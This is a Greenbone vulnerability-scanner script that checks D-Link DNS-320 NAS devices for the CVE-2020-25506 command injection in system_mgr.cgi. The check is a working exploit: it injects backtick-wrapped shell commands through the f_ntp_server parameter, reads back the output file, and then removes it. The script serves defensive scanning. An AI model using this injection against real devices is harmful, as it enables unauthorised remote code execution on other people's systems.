CPE_PREFIX = "cpe:/o:d-link:dns";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.145297" );
	script_version( "2021-08-17T09:01:01+0000" );
	script_tag( name: "last_modification", value: "2021-08-17 09:01:01 +0000 (Tue, 17 Aug 2021)" );
	script_tag( name: "creation_date", value: "2021-02-03 04:52:42 +0000 (Wed, 03 Feb 2021)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "severity_vector", value: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2021-02-04 21:40:00 +0000 (Thu, 04 Feb 2021)" );
	script_cve_id( "CVE-2020-25506" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_name( "D-Link DNS Devices RCE Vulnerability (SAP10183)" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2021 Greenbone Networks GmbH" );
	script_family( "General" );
	script_dependencies( "gb_dlink_dns_detect.sc" );
	script_mandatory_keys( "Host/is_dlink_dns_device" );
	script_tag( name: "summary", value: "D-Link DNS-320 devices are prone to a remote code execution vulnerability." );
	script_tag( name: "impact", value: "D-Link DNS-320 is affected by command injection in the system_mgr.cgi
  component, which can lead to remote arbitrary code execution." );
	script_tag( name: "vuldetect", value: "Sends multiple crafted HTTP GET requests and checks the responses." );
	script_tag( name: "affected", value: "D-Link DNS-320 and probably other DNS devices." );
	script_tag( name: "solution", value: "No solution was made available by the vendor. General solution options
  are to upgrade to a newer release, disable respective features, remove the product or replace the product by
  another one.

  The vendor states that the affected devices are EoL and recommends to immediately retire and replace such devices." );
	script_xref( name: "URL", value: "https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10183" );
	script_xref( name: "URL", value: "https://gist.github.com/WinMin/6f63fd1ae95977e0e2d49bd4b5f00675" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!infos = get_app_port_from_cpe_prefix( cpe: CPE_PREFIX, service: "www" )){
	exit( 0 );
}
cpe = infos["cpe"];
port = infos["port"];
if(!get_app_location( cpe: cpe, port: port, nofork: TRUE )){
	exit( 0 );
}
cmds = exploit_commands( "linux" );
for pattern in keys( cmds ) {
	vt_strings = get_vt_strings();
	filename = vt_strings["default_rand"] + ".txt";
	url = "/cgi-bin/system_mgr.cgi?C1=ON&cmd=cgi_ntp_time&f_ntp_server=`" + cmds[pattern] + "%20>%20" + filename + "`";
	req = http_get( port: port, item: url );
	res = http_keepalive_send_recv( port: port, data: req );
	req = http_get( port: port, item: "/cgi-bin/" + filename );
	res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
	if(egrep( pattern: pattern, string: res )){
		report = "It was possible to execute the \"" + cmds[pattern] + "\" command.\n\nResult:\n\n" + res;
		security_message( port: port, data: report );
		url = "/cgi-bin/system_mgr.cgi?C1=ON&cmd=cgi_ntp_time&f_ntp_server=`rm%20" + filename + "`";
		req = http_get( port: port, item: url );
		http_keepalive_send_recv( port: port, data: req );
		exit( 0 );
	}
}
exit( 99 );

